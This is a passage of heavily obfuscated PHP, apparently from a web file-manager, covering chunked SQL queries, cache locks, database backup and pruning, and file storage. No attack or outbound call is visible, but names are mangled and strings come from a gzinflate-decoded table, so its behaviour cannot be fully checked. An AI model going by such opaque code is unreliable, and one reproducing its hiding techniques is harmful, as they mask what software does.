$ŞíŠ¯ò× < count($ÕÍÀ¿öù); $ŞíŠ¯ò× += $Ïù—¤ÎÎ) { $Á…²Ôëí = array_slice($ÕÍÀ¿öù, $ŞíŠ¯ò×, $Ïù—¤ÎÎ); if (!is_array($Á…²Ôëí) || count($Á…²Ôëí) == 0) { break; } $–õİ™¨©[$ßâæıÏú[284]][$üÇ·Æš][1] = $Á…²Ôëí; $this->optionsValue($–õİ™¨©); $’Ì–ß—“ = parent::select($Úô‡ƒò®); if (!$’Ì–ß—“) { continue; } $¢µÂ±Ÿù = is_array($¢µÂ±Ÿù) ? $¢µÂ±Ÿù : array(); $¢µÂ±Ÿù = array_merge($¢µÂ±Ÿù, $’Ì–ß—“); } return $¢µÂ±Ÿù; } public function delete($Îêúˆ‚Ï = array()) { $©ú–ÁºÄ =& $_SERVER[ñ÷§¡å]; $Ğ§Èºü = self::SQL_WHERE_IN_CHUNK; $…‘öÅšé = $this->optionsValue(); $ã‹ê´¡ = $this->findWhereField($…‘öÅšé); if (!$ã‹ê´¡) { return parent::delete($Îêúˆ‚Ï); } $Çõ¯ìøŞ = 0; $¼òéıÆ = $…‘öÅšé[$©ú–ÁºÄ[284]][$ã‹ê´¡][1]; $¼òéıÆ = is_array($¼òéıÆ) ? $¼òéıÆ : array(); for ($Óˆ²Â³ = 0; $Óˆ²Â³ < count($¼òéıÆ); $Óˆ²Â³ += $Ğ§Èºü) { $íğ¬ÜÚ´ = array_slice($¼òéıÆ, $Óˆ²Â³, $Ğ§Èºü); if (!is_array($íğ¬ÜÚ´) || count($íğ¬ÜÚ´) == 0) { break; } $…‘öÅšé[$©ú–ÁºÄ[284]][$ã‹ê´¡][1] = $íğ¬ÜÚ´; $this->optionsValue($…‘öÅšé); $Çõ¯ìøŞ += parent::delete($Îêúˆ‚Ï); } return $Çõ¯ìøŞ; } private function findWhereField($“˜»Á‰Ø) { $‹²ß–œÑ =& $_SERVER[ñ÷§¡å]; $–µù²¯¯ = self::SQL_WHERE_IN_CHUNK; if (!is_array($“˜»Á‰Ø) || !is_array($“˜»Á‰Ø[$‹²ß–œÑ[284]])) { return !1; } foreach ($“˜»Á‰Ø[$‹²ß–œÑ[284]] as $¡¤ìÚ»ñ => $„´Ä¹û§) { if (is_array($„´Ä¹û§) && isset($„´Ä¹û§[0]) && is_string($„´Ä¹û§[0]) && strtolower($„´Ä¹û§[0]) == $‹²ß–œÑ[7] && is_array($„´Ä¹û§[1]) && count($„´Ä¹û§[1]) > $–µù²¯¯) { ignore_timeout(); return $¡¤ìÚ»ñ; } } return !1; } public function setMasterDB($ÔŠªÒ˜¿ = true) { think_config($_SERVER[ñ÷§¡å][404], $ÔŠªÒ˜¿); } } goto AØ§š“Š‚¿; c­±Öºø¤„: $xiheavgkys = $_SERVER[ñ÷§¡å][623]; if (!$xiheavgkys) { return; } $_SERVER[œ¥é˜‚®] = explode($_SERVER[ñ÷§¡å][624], gzinflate(substr($_SERVER[ñ÷§¡å][625], 10, -8))); goto Bä§Æìº; cÑƒâôÇ‡µ: class CacheLockRedis { public function lock($«ˆ²ù, $†®…Ü¯ = 10) { $¼§¹£•‚ = Cache::init(); $ù©Ä‹Ëâ = microtime(!0) + $†®…Ü¯; while (microtime(!0) < $ù©Ä‹Ëâ) { $¬ö“Ø = $¼§¹£•‚->get($«ˆ²ù); if (!$¬ö“Ø) { $ÖÉ¯‹‰¿ = $¼§¹£•‚->setLock($«ˆ²ù, $ù©Ä‹Ëâ, $†®…Ü¯); if ($ÖÉ¯‹‰¿) { return !0; } } else { if ($¬ö“Ø < microtime(!0)) { $¼§¹£•‚->set($«ˆ²ù, $ù©Ä‹Ëâ, $†®…Ü¯ * 2); if ($¼§¹£•‚->get($«ˆ²ù) === $¬ö“Ø) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÜïĞÊİ) { return Cache::init()->get($ÜïĞÊİ); } public function unlock($¾®ÜîÖÖ) { return Cache::init()->remove($¾®ÜîÖÖ); } } class CacheLockMemcached { public function lock($¢ï‡¾á…, $¯üîÖ– = 0) { $ù•©Âƒ = Cache::init(); $Šú›Äàı = microtime(!0) + $¯üîÖ–; while (microtime(!0) < $Šú›Äàı) { $…­ºê € = $ù•©Âƒ->get($¢ï‡¾á…); if (!$…­ºê € || $…­ºê € < microtime(!0)) { $•¯ùäĞÔ = $ù•©Âƒ->handle->add($¢ï‡¾á…, $Šú›Äàı, $¯üîÖ–); if ($•¯ùäĞÔ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($–¢àºû¡) { return Cache::init()->get($–¢àºû¡); } public function unlock($Ó¼ùšÅƒ) { return Cache::init()->remove($Ó¼ùšÅƒ); } } class CacheLockDatabase { public function lock($ÂÉşĞóÊ, $ıùùÂò = 0) { $¹–ßãô = Model($_SERVER[ñ÷§¡å][842]); $Ø¤ôÄ¢¶ = microtime(!0) + $ıùùÂò; while (microtime(!0) < $Ø¤ôÄ¢¶) { $ÃãÒã = $¹–ßãô->get($ÂÉşĞóÊ); if (!$ÃãÒã || $ÃãÒã < microtime(!0)) { $ïº‡…ó© = $¹–ßãô->set($ÂÉşĞóÊ, $Ø¤ôÄ¢¶); if ($ïº‡…ó©) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($÷†÷°‹À) { return Model($_SERVER[ñ÷§¡å][842])->get($÷†÷°‹À); } public function unlock($†ºŠ²ÉŸ) { Model($_SERVER[ñ÷§¡å][842])->remove($†ºŠ²ÉŸ); } } goto f°”ŸÅÊ«; Eƒ“‹ÙÃÅ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $‚›Î•Ô³ =& $_SERVER[ñ÷§¡å]; $this->isManual(); self::$name = date($‚›Î•Ô³[761]); if (!($¬™èÔÕÜ = Model($‚›Î•Ô³[762])->lastItem())) { $¬™èÔÕÜ = $this->initData(); } else { self::$name = $¬™èÔÕÜ[$‚›Î•Ô³[32]]; if ($¬™èÔÕÜ[$‚›Î•Ô³[763]] == $‚›Î•Ô³[98]) { self::$name = date($‚›Î•Ô³[764]); $öôæÅÂù = 0; if (isset($¬™èÔÕÜ[$‚›Î•Ô³[302]][$‚›Î•Ô³[209]][$‚›Î•Ô³[477]])) { $öôæÅÂù = (int) $¬™èÔÕÜ[$‚›Î•Ô³[302]][$‚›Î•Ô³[209]][$‚›Î•Ô³[477]]; } if (self::$manual == 0 && $¬™èÔÕÜ[$‚›Î•Ô³[32]] == self::$name) { Model($‚›Î•Ô³[762])->remove($¬™èÔÕÜ[$‚›Î•Ô³[408]]); } $¬™èÔÕÜ = $this->initData($öôæÅÂù, $¬™èÔÕÜ[$‚›Î•Ô³[765]]); } else { $this->checkStore($¬™èÔÕÜ[$‚›Î•Ô³[765]]); } } self::$option = $¬™èÔÕÜ; } private function isManual() { $±û²î‡ = _get($GLOBALS, $_SERVER[ñ÷§¡å][766], 0); $±û²î‡ = intval($±û²î‡); self::$manual = $±û²î‡ && $±û²î‡ == 1 ? 1 : 0; } private function initData($£¢ÒËëÔ = 0, $†–Â€·İ = '') { $¦à¦“Š =& $_SERVER[ñ÷§¡å]; $®Â¼ßÒš = Model($¦à¦“Š[762])->config(); if ($†–Â€·İ && $®Â¼ßÒš[$¦à¦“Š[765]] != $†–Â€·İ) { $£¢ÒËëÔ = 0; } $this->checkStore($®Â¼ßÒš[$¦à¦“Š[765]]); if (self::$manual == 1) { self::$name .= $¦à¦“Š[11] . date($¦à¦“Š[767]); } $•ª…¥²â = array($¦à¦“Š[765] => $®Â¼ßÒš[$¦à¦“Š[765]], $¦à¦“Š[32] => self::$name, $¦à¦“Š[763] => 0, $¦à¦“Š[768] => $®Â¼ßÒš[$¦à¦“Š[768]], $¦à¦“Š[769] => self::$manual, $¦à¦“Š[302] => array($¦à¦“Š[770] => array($¦à¦“Š[763] => 0), $¦à¦“Š[771] => array($¦à¦“Š[763] => 0, $¦à¦“Š[772] => 0, $¦à¦“Š[773] => 0, $¦à¦“Š[33] => $¦à¦“Š[12], $¦à¦“Š[774] => 0, $¦à¦“Š[506] => 0), $¦à¦“Š[775] => array($¦à¦“Š[763] => 0, $¦à¦“Š[772] => 0, $¦à¦“Š[773] => 0, $¦à¦“Š[774] => 0, $¦à¦“Š[506] => 0), $¦à¦“Š[209] => array($¦à¦“Š[763] => 0, $¦à¦“Š[776] => 0, $¦à¦“Š[777] => 0, $¦à¦“Š[778] => 0, $¦à¦“Š[779] => 0, $¦à¦“Š[477] => $£¢ÒËëÔ, $¦à¦“Š[774] => 0, $¦à¦“Š[506] => 0)), $¦à¦“Š[774] => time(), $¦à¦“Š[506] => 0); $‹éòš©¤ = Model($¦à¦“Š[762])->insert($•ª…¥²â); $•ª…¥²â[$¦à¦“Š[408]] = $‹éòš©¤; return $•ª…¥²â; } private function checkStore($¬‘‡««) { $†ËÏÑ— =& $_SERVER[ñ÷§¡å]; $ˆ‹Ô¬¢ü = Model($†ËÏÑ—[780])->listData($¬‘‡««); Model($†ËÏÑ—[780])->checkConfig($ˆ‹Ô¬¢ü); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ñ÷§¡å][762])->findByName(self::$name); } return self::$option; } public static function set($‡‘üùâø) { $ĞñÈ™î¸ =& $_SERVER[ñ÷§¡å]; $òİ…£ú = self::get(); foreach ($‡‘üùâø as $ÅŒÃ–ë’ => $Ûí³Š¶š) { $³¨Úâå = explode($ĞñÈ™î¸[10], $ÅŒÃ–ë’); $¶â×Ğøø = count($³¨Úâå); switch ($¶â×Ğøø) { case 1: $òİ…£ú[$³¨Úâå[0]] = $Ûí³Š¶š; break; case 2: $òİ…£ú[$³¨Úâå[0]][$³¨Úâå[1]] = $Ûí³Š¶š; break; case 3: $òİ…£ú[$³¨Úâå[0]][$³¨Úâå[1]][$³¨Úâå[2]] = $Ûí³Š¶š; break; } } Model($ĞñÈ™î¸[762])->update($òİ…£ú[$ĞñÈ™î¸[408]], $òİ…£ú); self::$option = $òİ…£ú; return self::$option; } public function keep() { $¬Ø‘ƒ¿ë =& $_SERVER[ñ÷§¡å]; $Í›À¸ô = self::get(); if ($Í›À¸ô[$¬Ø‘ƒ¿ë[302]][$¬Ø‘ƒ¿ë[770]][$¬Ø‘ƒ¿ë[763]] == $¬Ø‘ƒ¿ë[98]) { return; } $this->backupKeep($Í›À¸ô); self::set(array($¬Ø‘ƒ¿ë[781] => 1)); } private function backupKeep($Š‘Úš) { $ëœÕ™˜å =& $_SERVER[ñ÷§¡å]; if (self::$manual == 1) { return; } $Ú†ˆ…ô = Model($ëœÕ™˜å[762])->listData(); if (empty($Ú†ˆ…ô)) { return; } $ÏàˆØ×º = 0; $ÕÙãôÓ¬ = array(); foreach ($Ú†ˆ…ô as $ò§ïê’ö) { if ($ÏàˆØ×º >= 7) { break; } $ÕÙãôÓ¬[] = $ò§ïê’ö[$ëœÕ™˜å[32]]; $ÏàˆØ×º++; } for ($ÏàˆØ×º = 0; $ÏàˆØ×º < 12; $ÏàˆØ×º++) { $ÕÙãôÓ¬[] = date($ëœÕ™˜å[782], strtotime("\55{$ÏàˆØ×º}\x20\155\x6f\x6e\x74\x68\163")); } $ÕÙãôÓ¬ = array_unique($ÕÙãôÓ¬); $®Éş”Ìˆ = Model($ëœÕ™˜å[783])->get($ëœÕ™˜å[784]); foreach ($Ú†ˆ…ô as $ò§ïê’ö) { if (isset($ò§ïê’ö[$ëœÕ™˜å[769]]) && $ò§ïê’ö[$ëœÕ™˜å[769]] == $ëœÕ™˜å[98]) { continue; } if (!empty($ò§ïê’ö[$ëœÕ™˜å[32]]) && in_array($ò§ïê’ö[$ëœÕ™˜å[32]], $ÕÙãôÓ¬)) { continue; } Model($ëœÕ™˜å[762])->remove($ò§ïê’ö[$ëœÕ™˜å[408]]); $Ï“¯Èù± = $this->backupPath($Š‘Úš, $®Éş”Ìˆ); IO::remove($Ï“¯Èù±, !1); } } private function backupPath($«éıØ½§, $”Ø˜Ã„È = false) { $á¯ç‡§£ =& $_SERVER[ñ÷§¡å]; if (!$”Ø˜Ã„È) { $”Ø˜Ã„È = Model($á¯ç‡§£[783])->get($á¯ç‡§£[784]); } $İìÕÃ¥ = $«éıØ½§[$á¯ç‡§£[32]]; $áüÂ†¤ó = substr(md5($á¯ç‡§£[785] . $”Ø˜Ã„È . $İìÕÃ¥), 0, 8); return "\173\x69\x6f\x3a{$«éıØ½§[$á¯ç‡§£[765]]}\175\x2f\144\141\x74\141\142\141\163\145\57\142\x61\x63\x6b\165\160\57" . $İìÕÃ¥ . $á¯ç‡§£[11] . $áüÂ†¤ó; } public function db() { $µÌÇÏõ¥ =& $_SERVER[ñ÷§¡å]; $¤¾ºê©å = self::get(); if ($¤¾ºê©å[$µÌÇÏõ¥[302]][$µÌÇÏõ¥[771]][$µÌÇÏõ¥[763]] == $µÌÇÏõ¥[98]) { return !0; } $ˆÊÂŒúß = new BackupDb(); if (!$ˆÊÂŒúß->index()) { return !1; } self::set(array($µÌÇÏõ¥[786] => 1)); return !0; } public function dbFile() { $×éŒ“äş =& $_SERVER[ñ÷§¡å]; $†×°ÕŞ = self::get(); if ($†×°ÕŞ[$×éŒ“äş[302]][$×éŒ“äş[775]][$×éŒ“äş[763]] == $×éŒ“äş[98]) { return !0; } $™ ¼ŠÌ = new BackupDbFile(); if (!$™ ¼ŠÌ->index()) { return !1; } self::set(array($×éŒ“äş[787] => 1)); return !0; } public function file() { $ˆÔ±©Ñì =& $_SERVER[ñ÷§¡å]; $ÚÜÜ‰¡ß = self::get(); if ($ÚÜÜ‰¡ß[$ˆÔ±©Ñì[302]][$ˆÔ±©Ñì[209]][$ˆÔ±©Ñì[763]] == $ˆÔ±©Ñì[98]) { return !0; } if (!isset($ÚÜÜ‰¡ß[$ˆÔ±©Ñì[768]]) || $ÚÜÜ‰¡ß[$ˆÔ±©Ñì[768]] == $ˆÔ±©Ñì[207]) { $úïÚß‡â = new BackupFile(); if (!$úïÚß‡â->index()) { return !1; } } self::set(array($ˆÔ±©Ñì[788] => 1, $ˆÔ±©Ñì[763] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Îª ëÛ =& $_SERVER[ñ÷§¡å]; $ğ€àŸ ¿ = Backup::get(); self::$io = $ğ€àŸ ¿[$Îª ëÛ[765]]; self::$name = $ğ€àŸ ¿[$Îª ëÛ[32]]; $¢ª»õØØ = new DbManage(); $¥ıã¬‹Ù = $¢ª»õØØ->dbType(); $¹šû ®¯ = array($Îª ëÛ[789] => $¥ıã¬‹Ù, $Îª ëÛ[790] => time()); Backup::set($¹šû ®¯); $’ùğ±ıÁ = $this->tmpFilesPath() . $Îª ëÛ[791] . self::$name . $Îª ëÛ[8]; del_dir($’ùğ±ıÁ); mk_dir($’ùğ±ıÁ); $‹ãº¼…Ë = $ô£©ÇºÑ = 0; $ŸíÖÓËÊ = new Task($Îª ëÛ[792], $Îª ëÛ[793], 0, LNG($Îª ëÛ[794]) . $Îª ëÛ[795] . LNG($Îª ëÛ[796])); try { $ÔéÉü‚ = $¢ª»õØØ->db()->getTables(); } catch (Exception $Á†èŸ) { $ŸíÖÓËÊ->end(); return !1; } $ÔéÉü‚ = array_diff($ÔéÉü‚, array($Îª ëÛ[797], $Îª ëÛ[798])); foreach ($ÔéÉü‚ as $Òı±Ç½¼) { $‹ãº¼…Ë += $¢ª»õØØ->model($Òı±Ç½¼)->count(); } $ŸíÖÓËÊ->task[$Îª ëÛ[799]] = $‹ãº¼…Ë; $GLOBALS[$Îª ëÛ[800]] = self::$name; foreach ($ÔéÉü‚ as $Òı±Ç½¼) { $º–à§Ÿ  = $’ùğ±ıÁ . $Òı±Ç½¼ . $Îª ëÛ[801]; $¯õßò­¹ = null; if ($Òı±Ç½¼ == $Îª ëÛ[802] && (!isset($ğ€àŸ ¿[$Îª ëÛ[768]]) || $ğ€àŸ ¿[$Îª ëÛ[768]] == $Îª ëÛ[207])) { $¯õßò­¹ = self::$io; } $ô£©ÇºÑ += $¢ª»õØØ->sqlFromDb($Òı±Ç½¼, $º–à§Ÿ , $ŸíÖÓËÊ, $¯õßò­¹); } unset($GLOBALS[$Îª ëÛ[800]]); $ŸíÖÓËÊ->end(); if ($ô£©ÇºÑ > $‹ãº¼…Ë) { $‹ãº¼…Ë = $ô£©ÇºÑ; } $¹šû ®¯ = array($Îª ëÛ[789] => $¥ıã¬‹Ù, $Îª ëÛ[786] => 1, $Îª ëÛ[803] => $‹ãº¼…Ë, $Îª ëÛ[804] => $ô£©ÇºÑ, $Îª ëÛ[805] => time()); Backup::set($¹šû ®¯); if ($‹ãº¼…Ë - $ô£©ÇºÑ > 0) { $ÚìöÑ“… = $Îª ëÛ[806]; if (stristr(I18n::getType(), $Îª ëÛ[807])) { $ÚìöÑ“… = $Îª ëÛ[808]; } write_log(array($ÚìöÑ“…, $¹šû ®¯), $Îª ëÛ[793]); return !1; } return !0; } private function tmpFilesPath() { $áÅÜö’— =& $_SERVER[ñ÷§¡å]; $ƒã¨÷¨œ = TEMP_FILES; if ($GLOBALS[$áÅÜö’—[6]][$áÅÜö’—[99]][$áÅÜö’—[809]]) { $ƒã¨÷¨œ = $GLOBALS[$áÅÜö’—[6]][$áÅÜö’—[99]][$áÅÜö’—[809]]; if (!mk_dir($ƒã¨÷¨œ) || !is_writable($ƒã¨÷¨œ) || !IO::mkfile($ƒã¨÷¨œ . $áÅÜö’—[810])) { $ƒã¨÷¨œ = TEMP_FILES; } } return $ƒã¨÷¨œ; } } class BackupDbFile { public function __construct() { } public function index() { $åß¤Şúš =& $_SERVER[ñ÷§¡å]; $ŸàÜ¯È = Backup::get(); $ÆÍê„…ú = $ŸàÜ¯È[$åß¤Şúš[32]]; $õŸèŞÕô = $this->tmpFilesPath() . "\x62\141\x63\153\x75\160\x5f{$ÆÍê„…ú}\57"; $ÆÛ¾šº = $this->backupPath($ŸàÜ¯È); if (!($ÆÛ¾šº = IO::mkdir($ÆÛ¾šº))) { return !1; } $“¢°Ş°‰ = IO::listPath($õŸèŞÕô); $ÌÂåÂª = isset($“¢°Ş°‰[$åß¤Şúš[93]]) ? $“¢°Ş°‰[$åß¤Şúš[93]] : array(); $¶Å¤ˆô = array_sum(array_column($ÌÂåÂª, $åß¤Şúš[86])); if (!$¶Å¤ˆô) { return !1; } $ÇÎİÑš– = array($åß¤Şúš[811] => $¶Å¤ˆô, $åß¤Şúš[812] => time()); Backup::set($ÇÎİÑš–); $†ŒÅÏ = new TaskFileTransfer($åß¤Şúš[813], $åß¤Şúš[793], count($ÌÂåÂª), LNG($åß¤Şúš[794]) . $åß¤Şúš[395] . LNG($åß¤Şúš[796]) . $åß¤Şúš[814]); $†ŒÅÏ->task[$åß¤Şúš[776]] = $¶Å¤ˆô; foreach ($“¢°Ş°‰[$åß¤Şúš[93]] as $•Á¥¶Ôâ) { $ßë‘¨äÒ = IO::move($•Á¥¶Ôâ[$åß¤Şúš[94]], $ÆÛ¾šº); if (!$ßë‘¨äÒ) { $†ŒÅÏ->end(); $ª³Ê½­÷ = IO::getLastError($åß¤Şúš[815] . $•Á¥¶Ôâ[$åß¤Şúš[94]] . $åß¤Şúš[816] . $ÆÛ¾šº . $åß¤Şúš[174]); write_log($ª³Ê½­÷, $åß¤Şúš[793]); return !1; } } $Á°İŞ”  = new DbManage(); $Ã˜Ì•‹Ï = $Á°İŞ” ->getSqlFile(); if (!$Ã˜Ì•‹Ï[$åß¤Şúš[817]] || !$Ã˜Ì•‹Ï[$åß¤Şúš[13]]) { return !1; } IO::move($Ã˜Ì•‹Ï[$åß¤Şúš[817]], $ÆÛ¾šº); IO::move($Ã˜Ì•‹Ï[$åß¤Şúš[13]], $ÆÛ¾šº); $†ŒÅÏ->end(); $ÇÎİÑš– = array($åß¤Şúš[818] => $¶Å¤ˆô, $åß¤Şúš[819] => time()); Backup::set($ÇÎİÑš–); return !0; } private function backupPath($ªşò½†›) { $¤Óï¢ê” =& $_SERVER[ñ÷§¡å]; $çúÓ•ŒÀ = $ªşò½†›[$¤Óï¢ê”[32]]; $Ë¬Âœùœ = Model($¤Óï¢ê”[783])->get($¤Óï¢ê”[784]); $şú«¤Ó = substr(md5($¤Óï¢ê”[785] . $Ë¬Âœùœ . $çúÓ•ŒÀ), 0, 8); return "\173\151\157\x3a{$ªşò½†›[$¤Óï¢ê”[765]]}\x7d\x2f\x64\x61\x74\x61\142\x61\x73\145\x2f\142\141\143\x6b\x75\160\57" . $çúÓ•ŒÀ . $¤Óï¢ê”[11] . $şú«¤Ó; } private function tmpFilesPath() { $ˆç˜ô‚ş =& $_SERVER[ñ÷§¡å]; $ƒ•›êëí = TEMP_FILES; if ($GLOBALS[$ˆç˜ô‚ş[6]][$ˆç˜ô‚ş[99]][$ˆç˜ô‚ş[809]]) { $ƒ•›êëí = $GLOBALS[$ˆç˜ô‚ş[6]][$ˆç˜ô‚ş[99]][$ˆç˜ô‚ş[809]]; if (!mk_dir($ƒ•›êëí) || !is_writable($ƒ•›êëí) || !IO::mkfile($ƒ•›êëí . $ˆç˜ô‚ş[810])) { $ƒ•›êëí = TEMP_FILES; } } return $ƒ•›êëí; } } goto EèÍäîÈĞê; BëÉ²–‡›ã: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\145\x5f\143\x6f\x6e\x74\x65\156\x74\163"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\x54\x69\155\145", "\x74\151\155\145", "\x69\156\x73\145\x72\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\x6c\145"; protected $tableMeta = array("\164\141\142\x6c\145\116\141\155\145" => "\151\157\137\146\151\154\145\137\x6d\145\164\141", "\155\145\x74\141\106\151\145\154\144" => "\146\x69\x6c\145\x49\104"); public function fileInfo($ü ÷ö¼Å) { $Ì¬½üıÎ =& $_SERVER[ñ÷§¡å]; static $¾Àá—šë = array(); if (!isset($¾Àá—šë[$ü ÷ö¼Å])) { $õÎ¤Ë = $Ì¬½üıÎ[1884]; $÷¡ªÏÃ = Model($Ì¬½üıÎ[480])->field($õÎ¤Ë)->where(array($Ì¬½üıÎ[478] => $ü ÷ö¼Å))->find(); $¾Àá—šë[$ü ÷ö¼Å] = $÷¡ªÏÃ; } return $¾Àá—šë[$ü ÷ö¼Å]; } public function addFileByContent($£Â°¾š = '', $ëñù Èõ = '') { $¨¬ôà˜¶ =& $_SERVER[ñ÷§¡å]; $ëÜÖÊÔõ = TEMP_PATH . $¨¬ôà˜¶[1885]; if (!is_dir($ëÜÖÊÔõ)) { mk_dir($ëÜÖÊÔõ); } $›ˆéÆ = $ëÜÖÊÔõ . $¨¬ôà˜¶[1886] . rand_string(16); file_put_contents($›ˆéÆ, $£Â°¾š); $€Çùªƒ¬ = $this->addFile($›ˆéÆ, $ëñù Èõ, !0); if (file_exists($›ˆéÆ)) { @unlink($›ˆéÆ); } return $€Çùªƒ¬; } public function createFileName($•¢¿‚•‚, $øÎè®­Ü = false, $¦™àá¥ò = false) { $•úšˆñĞ =& $_SERVER[ñ÷§¡å]; $˜İİ–˜® = IO::init($•úšˆñĞ[8]); $Ã›àÃ¼ = $this->makeFilePath($•¢¿‚•‚, $˜İİ–˜®, $øÎè®­Ü, $¦™àá¥ò); $ªØàïò = $˜İİ–˜®->pathFather($Ã›àÃ¼); static $˜¼Ú¨…Å = false; $…í¢¡ = $•úšˆñĞ[1887] . md5($ªØàïò); if (!$˜¼Ú¨…Å && !Cache::get($…í¢¡)) { $˜¼Ú¨…Å = !0; $’‚è¾üå = IO::mkdir($ªØàïò); if (!IO::exist($’‚è¾üå . $•úšˆñĞ[810])) { IO::mkfile($’‚è¾üå . $•úšˆñĞ[810]); } Cache::set($…í¢¡, 1, 3600 * 2); } return $Ã›àÃ¼; } public function makeFilePath($Ÿ‡€“¤Î, $é¹Ş‘ß¼, $‡·®£éú = false, $‰‰Çƒî† = false) { $ñÙÎü”Ü =& $_SERVER[ñ÷§¡å]; $¼Ò»ºóÊ = Model($ñÙÎü”Ü[783])->get($ñÙÎü”Ü[1888]); $Ø°ê÷ô = KodIO::defaultIO() . date($ñÙÎü”Ü[1889]); $øÍÍä„ë = $Ø°ê÷ô . rand_string(5) . short_id(100); $Ÿ‡€“¤Î = str_replace($ñÙÎü”Ü[8], $ñÙÎü”Ü[11], KodIO::clear($Ÿ‡€“¤Î)); $üÚüæË = $é¹Ş‘ß¼->ext($Ÿ‡€“¤Î); if (!$Ÿ‡€“¤Î) { $¼Ò»ºóÊ = $ñÙÎü”Ü[1890]; } switch ($¼Ò»ºóÊ) { case $ñÙÎü”Ü[1891]: $øÍÍä„ë = $øÍÍä„ë . $ñÙÎü”Ü[10] . $é¹Ş‘ß¼->ext($Ÿ‡€“¤Î); if ($üÚüæË == $ñÙÎü”Ü[1828]) { $øÍÍä„ë .= $ñÙÎü”Ü[1558]; } break; case $ñÙÎü”Ü[1892]: $Ìó®ŞÒ× = Model($ñÙÎü”Ü[783])->get($ñÙÎü”Ü[784]); $ìê²‹ˆƒ = substr(md5($ñÙÎü”Ü[785] . $Ìó®ŞÒ× . date($ñÙÎü”Ü[761])), 0, 8); $¾òú£Ô× = KodIO::defaultDriver(); $Ø°ê÷ô = $ñÙÎü”Ü[1236] . $¾òú£Ô×[$ñÙÎü”Ü[408]] . $ñÙÎü”Ü[418] . date($ñÙÎü”Ü[1893]) . $ìê²‹ˆƒ . $ñÙÎü”Ü[8]; if ($üÚüæË == $ñÙÎü”Ü[1828]) { $Ÿ‡€“¤Î .= $ñÙÎü”Ü[1558]; } $ğªµñ’ = $ñÙÎü”Ü[1894] . $Ø°ê÷ô . $Ÿ‡€“¤Î; CacheLock::lock($ğªµñ’); $øÍÍä„ë = $Ø°ê÷ô . $Ÿ‡€“¤Î; if (IO::exist($Ø°ê÷ô . $Ÿ‡€“¤Î)) { $Æ…“³Öî = substr($Ÿ‡€“¤Î, 0, strlen($Ÿ‡€“¤Î) - strlen($üÚüæË)); $úÄİşÅâ = $‰‰Çƒî† ? substr($‰‰Çƒî†, 0, 5) : ($‡·®£éú ? substr($‡·®£éú, 0, 5) : rand_string(5)); $øÍÍä„ë = $Ø°ê÷ô . $Æ…“³Öî . $úÄİşÅâ . $ñÙÎü”Ü[10] . $üÚüæË; } if (IO::isTypeObject($øÍÍä„ë) && !IO::isUploadServer($øÍÍä„ë)) { if (IO::exist($øÍÍä„ë)) { return $øÍÍä„ë; } $ıœØùÓ¹ = IO::setContent($øÍÍä„ë, $ñÙÎü”Ü[12]); if (!$ıœØùÓ¹) { show_json($ñÙÎü”Ü[1895], !1); } } CacheLock::unlock($ğªµñ’); break; case $ñÙÎü”Ü[1890]: break; default: break; } return $øÍÍä„ë; } public function addFileByRemote($¡´ïêœ, $Ÿ³Œ˜¯´, $‘Üó‰æ = array()) { $Å«Ë°»Ì =& $_SERVER[ñ÷§¡å]; if (!IO::exist($¡´ïêœ)) { return !1; } $ã¯àª¨Ñ = $‘Üó‰æ[$Å«Ë°»Ì[186]] ? $‘Üó‰æ[$Å«Ë°»Ì[186]] : $Å«Ë°»Ì[12]; $”ë›¶ş‡ = IO::hashMd5($¡´ïêœ, $ã¯àª¨Ñ); $¶€óÈéä = KodIO::defaultDriver(); $ÙÑ”ùˆ = array($Å«Ë°»Ì[594] => IO::size($¡´ïêœ), $Å«Ë°»Ì[1896] => 1, $Å«Ë°»Ì[429] => $Ÿ³Œ˜¯´, $Å«Ë°»Ì[821] => $¶€óÈéä[$Å«Ë°»Ì[408]], $Å«Ë°»Ì[430] => $¡´ïêœ, $Å«Ë°»Ì[1897] => $‘Üó‰æ[$Å«Ë°»Ì[187]] ? $‘Üó‰æ[$Å«Ë°»Ì[187]] : IO::hashSimple($¡´ïêœ), $Å«Ë°»Ì[1898] => $”ë›¶ş‡ ? $”ë›¶ş‡ : $ã¯àª¨Ñ); if ($ĞÌÏİá® = $this->addFileCheckExist($ÙÑ”ùˆ[$Å«Ë°»Ì[187]], $ÙÑ”ùˆ[$Å«Ë°»Ì[186]], $ÙÑ”ùˆ[$Å«Ë°»Ì[86]])) { return $ĞÌÏİá®; } return $this->addFileData($ÙÑ”ùˆ); } private function addFileData($ÎËÓ½Ğ) { $Ë©öş£Ï =& $_SERVER[ñ÷§¡å]; if (!$ÎËÓ½Ğ) { return !1; } $ÎËÓ½Ğ[$Ë©öş£Ï[86]] = intval($ÎËÓ½Ğ[$Ë©öş£Ï[86]]); if (!$ÎËÓ½Ğ[$Ë©öş£Ï[86]] && strlen($ÎËÓ½Ğ[$Ë©öş£Ï[187]]) > 32) { $ÎËÓ½Ğ[$Ë©öş£Ï[86]] = intval(substr($ÎËÓ½Ğ[$Ë©öş£Ï[187]], 32)); } $Ñ£µë¯ü = $this->add($ÎËÓ½Ğ); return $this->find($Ñ£µë¯ü); } public function addFile($ŸàÃÓŒ, $™èÏ¬·Š, $ˆ…ÒüÅÎ = false) { $¥ìÒÌê =& $_SERVER[ñ÷§¡å]; $•òê¦Ç = IO::hashSimple($ŸàÃÓŒ); $ıƒ·±² = IO::size($ŸàÃÓŒ); $¶Ë™ŸË = $ıƒ·±² <= 1024 * 1024 * 10 ? IO::hashMd5($ŸàÃÓŒ) : $¥ìÒÌê[12]; $­ÎËÆ¼º = $¥ìÒÌê[1899] . $•òê¦Ç; CacheLock::lock($­ÎËÆ¼º); if ($¶Ë™ŸË && $•òê¦Ç) { $Ä‹³õ› = $this->addFileCheckExist($•òê¦Ç, $¶Ë™ŸË, $ıƒ·±²); if ($Ä‹³õ›) { CacheLock::unlock($­ÎËÆ¼º); return $Ä‹³õ›; } } $ÒşÅ¨Ş¼ = $this->addFileMake($ŸàÃÓŒ, $ıƒ·±², 